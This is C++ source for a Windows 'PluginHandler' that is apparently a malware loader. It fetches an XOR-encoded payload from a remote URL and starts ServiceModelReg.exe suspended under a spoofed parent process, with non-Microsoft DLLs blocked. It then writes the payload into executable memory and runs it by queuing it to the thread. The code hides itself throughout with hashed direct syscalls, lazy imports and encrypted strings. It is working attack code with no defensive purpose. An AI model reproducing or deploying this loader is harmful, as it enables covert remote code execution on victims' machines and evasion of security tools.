#include "PluginHandler.h"

static auto &syscall = freshycalls::Syscall::get_instance();

PluginHandler::PluginHandler(char *Param_1, char *Param_2, char *Param_3,
                             char *Param_4) {
  memcpy(this->Param_1, Param_1, 255);
  memcpy(this->Param_2, Param_2, 255);
  memcpy(this->Param_3, Param_3, 255);
  memcpy(this->Param_4, Param_4, 255);
}

PluginHandler::~PluginHandler() { clearPayload(); }

void PluginHandler::startLoadingThread(PluginHandler *Handler) {
  std::thread LoadingThread(&PluginHandler::startLoading, Handler);
  LoadingThread.detach();
}

void PluginHandler::startLoading(PluginHandler *Handler) {
  Handler->downloadPlugin();
  Handler->loadPlugin();

  delete Handler;
}

void PluginHandler::clearPayload() {
  if (this->PluginPayload != nullptr) {
    delete[] this->PluginPayload;
    this->PluginPayload = nullptr;
  }
}

DWORD64 PluginHandler::djb2(PBYTE str) {
  DWORD64 dwHash = 0x406275696c64657;
  INT c;

  while (c = *str++) {
    dwHash = ((dwHash << 0x5) + dwHash) + c;
  }
  return dwHash;
}

char *PluginHandler::wcharToChar(const wchar_t *Source) {
  char Destination[1024];
  int cSize = WideCharToMultiByte(CP_UTF8, 0, Source, -1, NULL, 0, NULL, NULL);

  WideCharToMultiByte(CP_UTF8, 0, Source, -1, Destination, cSize, NULL, NULL);

  return Destination;
}

wchar_t *PluginHandler::getFileNameFromPath(wchar_t *FullPath) {
  size_t len = wcslen(FullPath);
  for (size_t i = len - 2; i >= 0; i--) {
    if (FullPath[i] == '\\' || FullPath[i] == '/') {
      return FullPath + (i + 1);
    }
  }
  return FullPath;
}

wchar_t *PluginHandler::getDirectoryFromPath(wchar_t *FullPath,
                                             wchar_t *OutBuffer,
                                             const size_t OutBufferSize) {
  memset(OutBuffer, 0, OutBufferSize);

  memcpy(OutBuffer, FullPath, OutBufferSize);

  wchar_t *pName = getFileNameFromPath(OutBuffer);
  if (pName != nullptr) {
    *pName = '\0';
  }
  return OutBuffer;
}

HANDLE PluginHandler::getHandleFromImageName(DWORD64 ImageName) {
  for (int i = 4; i < 100000; i += 4) {
    HANDLE ProcessHandle = NULL;

    CLIENT_ID ClientID;
    ClientID.UniqueThread = NULL;
    ClientID.UniqueProcess = UlongToHandle(i);

    OBJECT_ATTRIBUTES ObjectAttributes;
    InitializeObjectAttributes(&ObjectAttributes, 0, 0, 0, 0);

    NTSTATUS status =
        syscall.CallSyscall(0xc819a6b27e2406ea, &ProcessHandle,
                            PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientID);

    if (ProcessHandle) {
      wchar_t ProcessImagePath[MAX_PATH * 2];
      memset(ProcessImagePath, 0, sizeof(ProcessImagePath));

      DWORD ulSize;

      if (syscall.CallSyscall(0x4e7381226f21adf4, ProcessHandle,
                              ProcessImageFileNameWin32, nullptr, 0,
                              &ulSize) == STATUS_INFO_LENGTH_MISMATCH) {
        PBYTE pUnicodeProcessImageName = (PBYTE)malloc(ulSize);

        if (syscall.CallSyscall(
                0x4e7381226f21adf4, ProcessHandle, ProcessImageFileNameWin32,
                pUnicodeProcessImageName, ulSize, nullptr) == STATUS_SUCCESS) {

          memcpy(ProcessImagePath,
                 PUNICODE_STRING(pUnicodeProcessImageName)->Buffer,
                 PUNICODE_STRING(pUnicodeProcessImageName)->Length);

          wchar_t *ProcessImageName;
          ProcessImageName = getFileNameFromPath(ProcessImagePath);

          if (djb2((PBYTE)wcharToChar(ProcessImageName)) == ImageName) {
            free(pUnicodeProcessImageName);
            return ProcessHandle;
          }
        }

        free(pUnicodeProcessImageName);
      }

      syscall.CallSyscall(0xbeefd24e4e69544f, ProcessHandle);
    }
  }
  return NULL;
}

bool PluginHandler::createProcess() {
  UNICODE_STRING UnicodeCommandLine = {0};
  UNICODE_STRING WorkingDirectory;

  auto *szFileName = new wchar_t[1024];
  wcscpy(szFileName, xorstr_(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0."
                             L"30319\\ServiceModelReg.exe"));

  auto *CommandLine = new wchar_t[1024];
  wcscpy(CommandLine,
         xorstr_(L"\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0."
                 L"30319\\ServiceModelReg.exe\" "));

  wchar_t szCurrentFolder[MAX_PATH * 2];
  memset(szCurrentFolder, 0, MAX_PATH * 2);
  getDirectoryFromPath(szFileName, szCurrentFolder, MAX_PATH * 2);

  UNICODE_STRING ImagePath, NtImagePath;

  LI_FN(RtlInitUnicodeString)(&ImagePath, szFileName);
  LI_FN(RtlDosPathNameToNtPathName_U)
      .in(LI_MODULE("ntdll.dll").cached())(ImagePath.Buffer, &NtImagePath, NULL,
                                           NULL);

  LI_FN(RtlInitUnicodeString)(&UnicodeCommandLine, CommandLine);
  LI_FN(RtlInitUnicodeString)(&WorkingDirectory, szCurrentFolder);

  PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
  PRTL_USER_PROCESS_PARAMETERS OwnParameters =
      (PRTL_USER_PROCESS_PARAMETERS)NtCurrentPeb()->ProcessParameters;

  LI_FN(RtlCreateProcessParametersEx)
      .in(LI_MODULE("ntdll.dll").cached())(
          &ProcessParameters, &ImagePath, NULL, &WorkingDirectory,
          &UnicodeCommandLine, NULL, &ImagePath, &OwnParameters->DesktopInfo,
          NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
  ProcessParameters->ConsoleHandle =
      reinterpret_cast<HANDLE>(0xfffffffffffffffd);

  PS_CREATE_INFO CreateInfo;

  memset(&CreateInfo, 0, sizeof(CreateInfo));
  CreateInfo.Size = sizeof(CreateInfo);
  CreateInfo.State = PsCreateInitialState;

  CreateInfo.InitState.u1.s1.WriteOutputOnExit = TRUE;
  CreateInfo.InitState.u1.s1.DetectManifest = TRUE;
  CreateInfo.InitState.u1.s1.ProhibitedImageCharacteristics = 0;
  CreateInfo.InitState.AdditionalFileAccess =
      FILE_READ_ATTRIBUTES | FILE_READ_DATA;

  const SIZE_T NumAttributes = 3;
  const SIZE_T AttributesSize =
      sizeof(SIZE_T) + NumAttributes * sizeof(PS_ATTRIBUTE);

  PPS_ATTRIBUTE_LIST AttributeList = reinterpret_cast<PPS_ATTRIBUTE_LIST>(LI_FN(
      RtlAllocateHeap)(RtlProcessHeap(), HEAP_ZERO_MEMORY, AttributesSize));
  AttributeList->TotalLength = AttributesSize;

  HANDLE ParentProcessHandle = getHandleFromImageName(0xe8b755f4e00bcd8);
  DWORD64 Policy =
      PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

  ULONG N = 0;
  AttributeList->Attributes[N].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
  AttributeList->Attributes[N].Size = NtImagePath.Length;
  AttributeList->Attributes[N].Value =
      reinterpret_cast<ULONG_PTR>(NtImagePath.Buffer);

  AttributeList->Attributes[N + 1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
  AttributeList->Attributes[N + 1].Size = sizeof(HANDLE);
  AttributeList->Attributes[N + 1].ValuePtr = ParentProcessHandle;

  AttributeList->Attributes[N + 2].Attribute =
      PS_ATTRIBUTE_MITIGATION_OPTIONS_2;
  AttributeList->Attributes[N + 2].Size = sizeof(DWORD64);
  AttributeList->Attributes[N + 2].ValuePtr = &Policy;

  ULONG NtProcessFlags = PROCESS_CREATE_FLAGS_NO_DEBUG_INHERIT;
  ULONG NtThreadFlags = THREAD_CREATE_FLAGS_CREATE_SUSPENDED;

  NTSTATUS Status = syscall.CallSyscall(
      0x28dd2723f901b16b, &ProcessHandle, &ThreadHandle, MAXIMUM_ALLOWED,
      MAXIMUM_ALLOWED, nullptr, nullptr, NtProcessFlags, NtThreadFlags,
      ProcessParameters, &CreateInfo, AttributeList);

  LI_FN(RtlFreeHeap)(RtlProcessHeap(), 0, AttributeList);
  LI_FN(RtlDestroyProcessParameters)(ProcessParameters);
  LI_FN(RtlFreeUnicodeString)(&NtImagePath);

  delete[] szFileName;
  delete[] CommandLine;

  syscall.CallSyscall(0xbeefd24e4e69544f, ParentProcessHandle);

  return true;
}

void PluginHandler::downloadPlugin() {
  HINTERNET Internet = LI_FN(InternetOpenA)
                           .in(LI_MODULE("wininet.dll").cached())(
                               xorstr_("Mozilla/5.0"),
                               INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
  HINTERNET UrlFile = nullptr;

  char *ReturnData = new char[PLUGIN_MAX_SIZE];
  int index = 0;
  if (Internet) {
    UrlFile = LI_FN(InternetOpenUrlA)
                  .in(LI_MODULE("wininet.dll").cached())(
                      Internet, this->Param_1, NULL, NULL,
                      INTERNET_FLAG_NO_CACHE_WRITE, NULL);

    if (UrlFile) {
      char Buffer[2048];
      DWORD BytesRead;

      do {
        LI_FN(InternetReadFile)
            .in(LI_MODULE("wininet.dll").cached())(UrlFile, Buffer, 2048,
                                                   &BytesRead);
        memcpy(ReturnData + index, Buffer, 2048);
        index += 2048;
        memset(Buffer, 0, 2048);
      } while (BytesRead);

      if (this->PluginPayload != nullptr) {
        delete[] this->PluginPayload;
        this->PluginPayload = nullptr;
      }
      this->PluginPayload = new char[PLUGIN_MAX_SIZE];
      memset(this->PluginPayload, 0, PLUGIN_MAX_SIZE);
      memcpy(this->PluginPayload, ReturnData, PLUGIN_MAX_SIZE);
      this->PayloadSize = PLUGIN_MAX_SIZE;
    }
  }

  LI_FN(InternetCloseHandle).in(LI_MODULE("wininet.dll").cached())(Internet);
  LI_FN(InternetCloseHandle).in(LI_MODULE("wininet.dll").cached())(UrlFile);
  delete[] ReturnData;
}

void PluginHandler::loadPlugin() {
  NTSTATUS Status;

  if (createProcess()) {
    LPVOID BasePointer = nullptr;
    SIZE_T BasePointerSize = this->PayloadSize;
    SIZE_T WriteSize = 1;

    Status = syscall.CallSyscall(0x576784122622e85e, ProcessHandle,
                                 &BasePointer, 0, &BasePointerSize, MEM_COMMIT,
                                 PAGE_EXECUTE_READWRITE);

    char *key = (char *)"shrnxhslajshdnrjsjdhwbdjehshdj";

    for (int i = 0; i < this->PayloadSize; i++) {
      this->PluginPayload[i] ^= key[i % 10];
      Status = syscall.CallSyscall(
          0x56c6c71c5dd495e4, ProcessHandle, LPVOID(DWORD64(BasePointer) + i),
          LPVOID(DWORD64(this->PluginPayload) + i), WriteSize, nullptr);
      this->PluginPayload[i] ^= key[i % 10];
    }

    Status = syscall.CallSyscall(0x4473fd36f533b78a, ThreadHandle, BasePointer,
                                 nullptr, nullptr);

    Status = syscall.CallSyscall(0xcd2faac41ea45602, ThreadHandle, NULL);

    syscall.CallSyscall(0xbeefd24e4e69544f, ProcessHandle);
    syscall.CallSyscall(0xbeefd24e4e69544f, ThreadHandle);
  }
}
